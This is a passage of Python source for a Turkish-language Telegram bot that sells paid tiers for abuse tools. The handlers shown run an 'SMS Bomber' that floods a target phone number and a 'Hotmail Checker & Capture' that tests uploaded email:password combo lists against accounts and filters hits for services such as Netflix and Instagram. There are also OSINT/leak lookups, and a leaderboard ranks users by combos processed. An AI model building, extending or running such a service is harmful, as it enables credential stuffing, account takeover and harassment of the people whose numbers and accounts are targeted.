                    bot_instance.answer_callback_query(call.id, "✅ Fatura gönderildi!")
                except Exception as e:
                    bot_instance.answer_callback_query(call.id, f"❌ Hata: {e}", show_alert=True)
                return
            # 🎨 AI IMAGE
            if data == "tool_aiimg":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
                credits = aiimg_get_credits(uid)
                if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
                elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
                else: durum = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT}  |  💎 Hak: {credits}"
                txt = (f"🎨 <b>AI IMAGE GENERATOR</b>\n"
                       f"━━━━━━━━━━━━━━━━━━━━━\n"
                       f"📊 {durum}\n\n"
                       f"📸 Bir fotoğraf gönder → AI dönüştürsün!\n\n"
                       f"<b>Örnek promptlar:</b>\n"
                       f"• <i>Lift your heart</i>\n"
                       f"• <i>Cyberpunk style</i>\n"
                       f"• <i>Turn into anime</i>")
                try:
                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                                   reply_markup=aiimg_kb(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=aiimg_kb(uid), parse_mode="HTML")
                return
            if data == "aiimg_generate":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    "📸 <b>AI Resim İçin Fotoğraf Gönder</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    "Bir fotoğraf gönder, ardından promptunu yaz.",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: aiimg_process(m, bot_instance))
                return
            if data == "aiimg_packages":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                txt = (f"💎 <b>AI RESİM HAK PAKETLERİ</b>\n"
                       f"━━━━━━━━━━━━━━━━━━━━━\n"
                       f"• <b>{AI_IMG_PACK_25} Hak</b> → {AI_IMG_PRICE_25} ⭐\n"
                       f"• <b>{AI_IMG_PACK_50} Hak</b> → {AI_IMG_PRICE_50} ⭐\n"
                       f"• <b>{AI_IMG_PACK_250} Hak</b> → {AI_IMG_PRICE_250} ⭐")
                try:
                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                                   reply_markup=aiimg_packages_kb(), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=aiimg_packages_kb(), parse_mode="HTML")
                return
            if data == "aiimg_my_stats":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                aiimg_show_stats(call.message.chat.id, uid, bot_instance)
                return
            if data.startswith("aiimg_buy_"):
                pkg_num = data.replace("aiimg_buy_", "")
                pkg_map = {"25":(AI_IMG_PACK_25,AI_IMG_PRICE_25,"25 Hak"),
                           "50":(AI_IMG_PACK_50,AI_IMG_PRICE_50,"50 Hak"),
                           "250":(AI_IMG_PACK_250,AI_IMG_PRICE_250,"250 Hak")}
                if pkg_num not in pkg_map:
                    try: bot_instance.answer_callback_query(call.id, "❌ Geçersiz paket!", show_alert=True)
                    except: pass
                    return
                qty, stars, label = pkg_map[pkg_num]
                prices = [LabeledPrice(label=label, amount=stars)]
                try:
                    bot_instance.send_invoice(chat_id=call.message.chat.id, title=f"🎨 {label}",
                        description=f"{qty} adet AI resim üretim hakkı",
                        invoice_payload=f"aiimg_{pkg_num}", provider_token="", currency="XTR", prices=prices)
                    bot_instance.answer_callback_query(call.id, "✅ Fatura gönderildi!")
                except Exception as e:
                    bot_instance.answer_callback_query(call.id, f"❌ Hata: {e}", show_alert=True)
                return
            if data == "tool_exif":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    "📸 <b>EXIF Metadata Okuyucu</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "Analiz etmek istediğin fotoğrafı gönder.",
                    parse_mode="HTML")
                return
            if data == "tool_music":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    "🎵 <b>Müzik İndirici</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    "📌 <b>Kullanım:</b>\n"
                    "<code>/sarki Sanatçı Şarkı</code>",
                    parse_mode="HTML")
                return
            if data.startswith("sms_"):
                parts = data.split("_")
                mode = parts[1]; phone = parts[2]; mail = parts[3] if len(parts) > 3 else ""
                if mode == "normal":
                    m = bot_instance.send_message(call.message.chat.id,
                        f"⚡ <b>Normal Mod Seçildi</b>\n"
                        f"📱 Hedef: <code>{esc(phone)}</code>\n"
                        f"🔢 Limit gir:\n⏱ Aralık gir:\n"
                        f"Örnek: <code>50 2</code>", parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _sms_normal_settings(m, phone, mail, bot_instance))
                else:
                    _launch_sms_bomb(uid, phone, mail, "turbo", None, 0, bot_instance)
                    try: bot_instance.answer_callback_query(call.id, "🚀 Turbo mod başlatıldı!")
                    except: pass
                return
            if data == "tool_addbot":
                prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get("addbot")
                m = bot_instance.send_message(call.message.chat.id, prompt, parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_addbot(m, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_php2py":
                bot_instance.send_message(call.message.chat.id, s(uid, "php2py"), parse_mode="HTML")
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_smsbomb":
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                        try: bot_instance.answer_callback_query(call.id, "⚠️ Aktif bombardıman var!", show_alert=True)
                        except: pass
                        return
                m = bot_instance.send_message(call.message.chat.id,
                    "💣 <b>SMS Bomber</b>\n📱 Hedef numarayı girin (10 haneli):\nÖrnek: <code>5306524123</code>",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_hotmail":
                user_name = esc(get_user_name(uid))
                keywords = get_user_keywords(uid)
                limit_text = get_keyword_limit_text(uid)
                is_prem = is_premium(uid)
                capture_left = get_capture_limit_text(uid)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(
                        f"📧 <b>HOTMAIL CHECKER & CAPTURE</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 Kullanıcı: {user_name}\n"
                        f"🔖 Keyword: {esc(', '.join(keywords))}\n"
                        f"📊 Keyword Limit: {limit_text}\n"
                        f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT})'}\n"
                        f"📸 Capture: {'⭐ Premium' if is_prem else f'🆓 Free ({capture_left})'}\n"
                        f"📌 Aşağıdaki menüden işlem yapın:",
                        call.message.chat.id, call.message.message_id,
                        reply_markup=hotmail_keyboard(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id,
                        "📧 <b>HOTMAIL CHECKER & CAPTURE</b>\n📌 Aşağıdaki menüden işlem yapın:",
                        reply_markup=hotmail_keyboard(uid), parse_mode="HTML")
                return
            if data == "hotmail_start":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                is_prem = is_premium(uid)
                limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
                m = bot_instance.send_message(call.message.chat.id,
                    f"📧 <b>Hotmail Checker</b>\n"
                    f"📌 Limit: {limit} satır\n"
                    f"Lütfen combo dosyasını (email:password) gönderin.", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_hotmail_file(m, bot_instance))
                return
            if data == "hotmail_addkw":
                if not can_add_keyword(uid):
                    try: bot_instance.answer_callback_query(call.id, f"❌ Limit dolu: {get_keyword_limit_text(uid)}", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    f"➕ <b>Keyword Ekle</b>\n"
                    f"Mevcut: {esc(', '.join(get_user_keywords(uid)))}\n"
                    f"Limit: {get_keyword_limit_text(uid)}", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_add_keyword(m, bot_instance, uid))
                return
            if data == "hotmail_delkw":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    f"🗑️ <b>Keyword Sil</b>\n"
                    f"Mevcut: {esc(', '.join(get_user_keywords(uid)))}", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_del_keyword(m, bot_instance, uid))
                return
            if data == "hotmail_resetkw":
                set_user_keywords(uid, ["tiktok","instagram","netflix"])
                try: bot_instance.answer_callback_query(call.id, "✅ Keywordler sıfırlandı!", show_alert=True)
                except: pass
                return
            if data == "capture_menu":
                if not can_use_capture(uid):
                    try: bot_instance.answer_callback_query(call.id, "❌ Capture hakkınız doldu!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(
                        f"📸 <b>CAPTURE TOOL</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 {esc(get_user_name(uid))}\n"
                        f"📌 Aşağıdan platform seçin:",
                        call.message.chat.id, call.message.message_id,
                        reply_markup=capture_keyboard(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, "📸 <b>CAPTURE TOOL</b>",
                                              reply_markup=capture_keyboard(uid), parse_mode="HTML")
                return
            if data == "goto_hotmail":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text("📧 <b>HOTMAIL CHECKER & CAPTURE</b>\n📌 Aşağıdaki menüden işlem yapın:",
                                                   call.message.chat.id, call.message.message_id,
                                                   reply_markup=hotmail_keyboard(uid), parse_mode="HTML")
                except: pass
                return
            if data == "capture_all":
                if not is_premium(uid):
                    try: bot_instance.answer_callback_query(call.id, "🔒 Sadece Premium!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id, "📸 <b>Tüm Platformlar</b>\nCombo dosyasını gönderin.", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, None))
                return
            if data.startswith("capture_"):
                try:
                    num = int(data.split("_")[1])
                    if num in CAPTURE_APPS:
                        target_app = CAPTURE_APPS[num]; platform_name = CAPTURE_NAMES[num]
                        try: bot_instance.answer_callback_query(call.id)
                        except: pass
                        m = bot_instance.send_message(call.message.chat.id,
                            f"📸 <b>{platform_name} Seçildi</b>\nCombo dosyasını gönderin.", parse_mode="HTML")
                        bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, target_app))
                except: pass
                return
            if data.startswith("tool_"):
                key = data[5:]
                if key == "video":
                    m = bot_instance.send_message(call.message.chat.id, s(uid, "video_ask"), parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))
                elif key == "predunyam":
                    _run_predunyam(call.message.chat.id, uid, bot_instance)
                elif key == "php2py":
                    bot_instance.send_message(call.message.chat.id, s(uid, "php2py"), parse_mode="HTML")
                elif key in ("proxycheck", "urlscan"):
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt, parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _process_special_tool(m, key, bot_instance))
                elif key in TOOLS_API:
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt, parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _process_generic_tool(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("tr_"):
                key = data[3:]
                prompt = TURKEY_PROMPTS.get(lang(uid), TURKEY_PROMPTS["tr"]).get(key, s(uid, "enter_val"))
                m = bot_instance.send_message(call.message.chat.id, s(uid, "tr_ask", prompt=prompt), parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_turkey(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("ls_"):
                if not is_premium_osint(uid):
                    try: bot_instance.answer_callback_query(call.id, "🌍 OSINT Premium gerekli!", show_alert=True)
                    except: pass
                    return
                key = data[3:]
                info = LEAKSIGHTS_API.get(key, {})
                m = bot_instance.send_message(call.message.chat.id,
                    s(uid, "ls_ask", icon=info.get("icon", "🔍"),
                      tool=esc(info.get(lang(uid), info.get("tr", key)))), parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_ls(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("adm_"):
                if uid != ADMIN_ID:
                    try: bot_instance.answer_callback_query(call.id, s(uid, "admin_only"), show_alert=True)
                    except: pass
                    return
                _handle_admin_cb(call, data[4:], bot_instance)
                return
            if data.startswith("setapi_"):
                val = data[7:]
                if val == "default":
                    db_set(uid, "api_pref", 0)
                    try: bot_instance.answer_callback_query(call.id, "✅ Varsayılan API")
                    except: pass
                else:
                    idx = int(val); db_set(uid, "api_pref", idx)
                    try: bot_instance.answer_callback_query(call.id, f"✅ {API_LIST[idx]['name']}")
                    except: pass
                _show_api_menu(call.message.chat.id, uid, bot_instance,
                               edit=(call.message.chat.id, call.message.message_id))
                return
        except Exception as e:
            print(f"[CALLBACK ERROR] {e}")
            try: bot_instance.answer_callback_query(call.id, "⚠️ Bir hata oluştu!", show_alert=True)
            except: pass

    @bot_instance.pre_checkout_query_handler(func=lambda q: True)
    def precheckout(q):
        bot_instance.answer_pre_checkout_query(q.id, ok=True)

    @bot_instance.message_handler(content_types=["successful_payment"])
    def payment_ok(msg):
        uid = msg.from_user.id
        username = msg.from_user.username or msg.from_user.first_name or str(uid)
        payload = msg.successful_payment.invoice_payload
        if payload.startswith("aiimg_"):
            pkg_num = payload.replace("aiimg_", "")
            pkg_map = {"25":(AI_IMG_PACK_25,AI_IMG_PRICE_25,"25 Hak"),
                       "50":(AI_IMG_PACK_50,AI_IMG_PRICE_50,"50 Hak"),
                       "250":(AI_IMG_PACK_250,AI_IMG_PRICE_250,"250 Hak")}
            if pkg_num in pkg_map:
                qty, stars, label = pkg_map[pkg_num]
                aiimg_add_credits(uid, qty)
                aiimg_log_purchase(uid, username, label, qty, stars)
                bot_instance.reply_to(msg,
                    f"🎉 <b>Ödeme Başarılı!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎨 Paket: <b>{label}</b>\n"
                    f"➕ Eklenen: <b>+{qty}</b> AI resim hakkı\n"
                    f"💎 Yeni hak: <b>{aiimg_get_credits(uid)}</b>",
                    parse_mode="HTML")
                try:
                    bot_instance.send_message(ADMIN_ID,
                        f"💰 <b>YENİ AI SATIN ALMA!</b>\n👤 @{esc(username)}\n📦 {label} — {stars}⭐",
                        parse_mode="HTML")
                except: pass
            return
        if payload.startswith("tgid_"):
            pkg_num = payload.replace("tgid_", "")
            pkg_map = {"25":(TGID_PACKAGE_25,TGID_PRICE_25,"25 Sorgu"),
                       "50":(TGID_PACKAGE_50,TGID_PRICE_50,"50 Sorgu"),
                       "100":(TGID_PACKAGE_100,TGID_PRICE_100,"100 Sorgu")}
            if pkg_num in pkg_map:
                qty, stars, label = pkg_map[pkg_num]
                tgid_add_balance(uid, qty)
                tgid_log_purchase(uid, username, label, qty, stars)
                bot_instance.reply_to(msg,
                    f"🎉 <b>Ödeme Başarılı!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 Paket: <b>{label}</b>\n"
                    f"➕ Eklenen: <b>+{qty}</b> TG-ID hakkı\n"
                    f"💰 Yeni Bakiye: <b>{tgid_get_balance(uid)}</b>",
                    parse_mode="HTML")
                try:
                    bot_instance.send_message(ADMIN_ID,
                        f"💰 <b>YENİ TG-ID SATIN ALMA!</b>\n👤 @{esc(username)}\n📦 {label} — {stars}⭐",
                        parse_mode="HTML")
                except: pass
            return
        if payload == "premium":
            set_premium(uid, username)
            bot_instance.reply_to(msg,
                "🎉 <b>Hotmail Premium aktif!</b>\n"
                "📧 Sınırsız Hotmail + 📸 Capture + 🔖 Keyword + 🆔 TG-ID + 🎨 AI",
                parse_mode="HTML")
            bot_instance.send_message(ADMIN_ID,
                f"📧 <b>YENİ HOTMAIL PREMIUM</b>\n👤 @{esc(username)}\n🆔 {uid}\n💰 {PREMIUM_PRICE}⭐",
                parse_mode="HTML")
        elif payload == "osint":
            set_premium_osint(uid, username)
            bot_instance.reply_to(msg, "🌍 <b>OSINT Premium aktif!</b>", parse_mode="HTML")
            bot_instance.send_message(ADMIN_ID,
                f"🌍 <b>YENİ OSINT PREMIUM</b>\n👤 @{esc(username)}\n🆔 {uid}\n💰 {OSINT_PRICE}⭐",
                parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  PROCESS FUNCTIONS
# ══════════════════════════════════════════════════════════════
def _resolve_target(text):
    text = text.strip()
    if text.startswith("@"):
        username = text[1:]
        row = find_user_by_username(username)
        return (row[0], row[1]) if row else (None, None)
    elif text.isdigit():
        user_id = int(text)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id, username FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone(); conn.close()
        return (row[0], row[1] or str(row[0])) if row else (user_id, str(user_id))
    return (None, None)

def _admin_premium_select_user(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!", parse_mode="HTML")
        return
    add_user(tid, tuname or "", "Premium Verildi")
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("📧 Hotmail Premium Ver", f"adm_give_hotmail_{tid}_{tuname or tid}"),
           _btn("🌍 OSINT Premium Ver", f"adm_give_osint_{tid}_{tuname or tid}"),
           _btn("📸 Capture Premium Ver", f"adm_give_capture_{tid}_{tuname or tid}"))
    bot_instance.send_message(msg.chat.id,
        f"👤 Kullanıcı: @{esc(tuname or tid)} (ID: {tid})\nHangi premiumu vermek istiyorsun?",
        reply_markup=mk, parse_mode="HTML")

def _admin_give_premium_hotmail(call, tid, tuname, bot_instance):
    if is_premium(tid):
        try: bot_instance.answer_callback_query(call.id, f"ℹ️ Zaten Premium!", show_alert=True)
        except: pass
        return
    if set_premium(tid, tuname or str(tid)):
        try: bot_instance.edit_message_text(f"📧 @{esc(tuname or tid)} Hotmail Premium verildi!", call.message.chat.id, call.message.message_id, parse_mode="HTML"); bot_instance.answer_callback_query(call.id, "✅")
        except: pass

def _admin_give_premium_osint(call, tid, tuname, bot_instance):
    if is_premium_osint(tid):
        try: bot_instance.answer_callback_query(call.id, "ℹ️ Zaten OSINT Premium!", show_alert=True)
        except: pass
        return
    if set_premium_osint(tid, tuname or str(tid)):
        try: bot_instance.edit_message_text(f"🌍 @{esc(tuname or tid)} OSINT Premium verildi!", call.message.chat.id, call.message.message_id, parse_mode="HTML"); bot_instance.answer_callback_query(call.id, "✅")
        except: pass

def _admin_give_premium_capture(call, tid, tuname, bot_instance):
    if is_premium(tid):
        try: bot_instance.answer_callback_query(call.id, "ℹ️ Zaten Premium!", show_alert=True)
        except: pass
        return
    if set_premium(tid, tuname or str(tid)):
        try: bot_instance.edit_message_text(f"📸 @{esc(tuname or tid)} Capture Premium verildi!", call.message.chat.id, call.message.message_id, parse_mode="HTML"); bot_instance.answer_callback_query(call.id, "✅")
        except: pass

def _process_add_keyword(msg, bot_instance, uid):
    text = msg.text.strip()
    if not text:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!", parse_mode="HTML")
        return
    new_keywords = [k.strip().lower() for k in text.split(',') if k.strip()]
    if not new_keywords:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!", parse_mode="HTML")
        return
    current_keywords = get_user_keywords(uid)
    added = []; failed = []
    for kw in new_keywords:
        if kw in current_keywords: failed.append(f"'{esc(kw)}' zaten mevcut"); continue
        if not can_add_keyword(uid): failed.append("Limit dolu!"); break
        current_keywords.append(kw); added.append(kw)
    if added:
        set_user_keywords(uid, current_keywords)
        bot_instance.reply_to(msg,
            f"✅ <b>Keywordler eklendi!</b>\n"
            f"➕ Eklenen: {esc(', '.join(added))}\n"
            f"📊 Mevcut: {esc(', '.join(current_keywords))}",
            parse_mode="HTML")
    else:
        bot_instance.reply_to(msg, f"❌ <b>Eklenemedi!</b>\n{esc(', '.join(failed))}", parse_mode="HTML")

def _process_del_keyword(msg, bot_instance, uid):
    text = msg.text.strip().lower()
    if not text:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!", parse_mode="HTML")
        return
    del_keywords = [k.strip() for k in text.split(',') if k.strip()]
    current_keywords = get_user_keywords(uid)
    removed = []; not_found = []
    for kw in del_keywords:
        if kw in current_keywords: current_keywords.remove(kw); removed.append(kw)
        else: not_found.append(kw)
    if removed:
        set_user_keywords(uid, current_keywords)
        result_msg = f"✅ <b>Silindi!</b>\n🗑️ {esc(', '.join(removed))}\n"
        if not_found: result_msg += f"❌ Bulunamadı: {esc(', '.join(not_found))}\n"
        result_msg += f"\n📊 Mevcut: {esc(', '.join(current_keywords))}"
        bot_instance.reply_to(msg, result_msg, parse_mode="HTML")
    else:
        bot_instance.reply_to(msg, f"❌ <b>Bulunamadı:</b> {esc(', '.join(not_found))}", parse_mode="HTML")

def _process_capture_file(msg, bot_instance, target_app):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Geçerli bir dosya gönderin!", parse_mode="HTML")
        return
    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [line.strip() for line in combo_text.splitlines() if line.strip() and ":" in line.strip()]
        if not combo_list:
            bot_instance.reply_to(msg, "❌ Geçerli combo bulunamadı!", parse_mode="HTML")
            return
        if not can_use_capture(uid):
            bot_instance.reply_to(msg, "❌ Capture hakkınız doldu!", parse_mode="HTML")
            return
        platform_name = "Tüm Platformlar"
        if target_app:
            for num, app_mail in CAPTURE_APPS.items():
                if app_mail == target_app: platform_name = CAPTURE_NAMES[num]; break
        increment_capture_used(uid)
        status_msg = bot_instance.reply_to(msg,
            f"📸 <b>Capture Taraması Başladı!</b>\n"
            f"📂 Toplam: {len(combo_list)} satır\n🎯 Hedef: {platform_name}",
            parse_mode="HTML")
        def run_capture():
            user_name = get_user_name(uid); is_prem = is_premium(uid)
            start_capture_scan(combo_list, uid, user_name, is_prem, target_app)
            with CAPTURE_LOCK:
                results = CAPTURE_RESULTS.get(uid, []); bad_count = CAPTURE_BAD; processed = CAPTURE_PROCESSED
                if results:
                    try:
                        bot_instance.edit_message_text(
                            f"✅ <b>Capture Tamamlandı!</b>\n📊 Hit: {len(results)}\n❌ Bad: {bad_count}\n📂 İşlenen: {processed}",
                            uid, status_msg.message_id, parse_mode="HTML")
                        if os.path.exists(f"capture_hits_{uid}.txt") and os.path.getsize(f"capture_hits_{uid}.txt") > 0:
                            with open(f"capture_hits_{uid}.txt", "rb") as f:
                                bot_instance.send_document(uid, f, caption=f"📸 {len(results)}x Capture Hit")
                            os.remove(f"capture_hits_{uid}.txt")
                    except: pass
                else:
                    try: bot_instance.edit_message_text(f"❌ Hit bulunamadı!\nİşlenen: {processed}", uid, status_msg.message_id, parse_mode="HTML")
                    except: pass
        threading.Thread(target=run_capture, daemon=True).start()
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {esc(e)}", parse_mode="HTML")

def _show_stats(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats"), parse_mode="HTML")
        return
    checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
    daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    txt = (f"{s(uid, 'stats_title')}\n"
           f"{'─' * 30}\n"
           f"🔍 Sorgu: <b>{checks}</b>\n📦 Combo: <b>{combos}</b>\n"
           f"📧 Hotmail Premium: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
           f"🌍 OSINT Premium: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
           f"🆔 TG-ID Free: {max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))}/{TGID_FREE_LIMIT}\n"
           f"💰 TG-ID Bakiye: {tgid_get_balance(uid)}\n"
           f"🎨 AI Free: {max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))}/{AI_IMG_FREE_LIMIT}\n"
           f"💎 AI Hak: {aiimg_get_credits(uid)}\n"
           f"📊 Günlük: {daily['checks']}/{limit}\n"
           f"📸 Capture: {capture_used}/{'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"\n👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _show_profile(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats"), parse_mode="HTML")
        return
    checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
    user_name = esc(get_user_name(uid))
    daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    kw_list = keywords.split(',') if keywords else []
    tgid_free = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
    aiimg_free = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
    txt = (f"⚡️ <b>SİSTEME HOŞGELDİNİZ</b>\n"
           f"{user_name} — {uid}\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"👤 <b>KULLANICI PROFİLİ</b>\n"
           f"┣ Durum: {'🔴 YASAKLI' if is_banned_user else '🟢 ÇEVRİMİÇİ'}\n"
           f"┗ Lisans: {'⭐ PREMIUM' if is_prem else '🆓 FREE USER'}\n"
           f"📊 <b>İSTATİSTİKLER</b>\n"
           f"┣ Günlük: {daily['checks']} / {limit}\n"
           f"┣ Toplam Check: {checks + combos}\n"
           f"┣ Keywordler: {len(kw_list)} / {get_keyword_limit_text(uid)}\n"
           f"┗ Capture: {capture_used} / {'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"🆔 <b>TG-ID SORGU</b>\n"
           f"┣ Toplam: {tgid_get_total(uid)}\n┣ Free kalan: {tgid_free}/{TGID_FREE_LIMIT}\n"
           f"┗ Bakiye: {tgid_get_balance(uid)}\n"
           f"🎨 <b>AI IMAGE</b>\n"
           f"┣ Toplam: {aiimg_get_total(uid)}\n┣ Free kalan: {aiimg_free}/{AI_IMG_FREE_LIMIT}\n"
           f"┗ Hak: {aiimg_get_credits(uid)}\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"⭐ <b>PREMIUM DURUM</b>\n"
           f"📧 Hotmail: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
           f"🌍 OSINT: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
           f"📅 Tarih: {esc(prem_date or '—')}\n"
           f"👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _show_leaderboard(chat_id, uid, bot_instance):
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT user_id,username,first_name,total_checks,total_combos,is_premium,is_premium_osint FROM users WHERE is_banned=0 ORDER BY total_combos DESC LIMIT 10")
    users = c.fetchall(); conn.close()
    if not users:
        bot_instance.send_message(chat_id, s(uid, "lb_title") + "\n❌ Veri yok.", parse_mode="HTML")
        return
    medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
    txt = f"{s(uid, 'lb_title')}\n{'─' * 30}\n"
    for i, (u_id, uname, fname, tchk, tcmb, is_prem, is_prem_osint) in enumerate(users):
        nm = esc((fname or uname or str(u_id))[:15])
        pk = "⭐" if (is_prem or is_prem_osint) else ""
        txt += f"{medals[i]} <b>{nm}</b> {pk}\n📦 {tcmb}  🔍 {tchk}\n"
    txt += f"👨‍💻 @hackledin"
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _show_api_menu(chat_id, uid, bot_instance, edit=None):
    cur = api_pref(uid)
    cur_name = API_LIST[cur]["name"] if cur < len(API_LIST) else "Varsayılan"
    txt = s(uid, "api_title", cur=cur_name)
    mk = InlineKeyboardMarkup(row_width=1)
    for i, api in enumerate(API_LIST):
        ico = "✅" if i == cur else "◻️"
        mk.add(_btn(f"{ico} {api['name']}", f"setapi_{i}"))
    mk.add(_btn("🔄 Varsayılan", "setapi_default"))
    mk.add(_btn(s(uid, "home_btn"), "goto_home"))
    if edit:
        try:
            bot_instance.edit_message_text(txt, edit[0], edit[1], reply_markup=mk, parse_mode="HTML")
            return
        except: pass
    bot_instance.send_message(chat_id, txt, reply_markup=mk, parse_mode="HTML")

def _show_help(chat_id, uid, bot_instance):
    status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
    txt = s(uid, "help_content", status=status)
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _process_combo(msg, bot_instance):
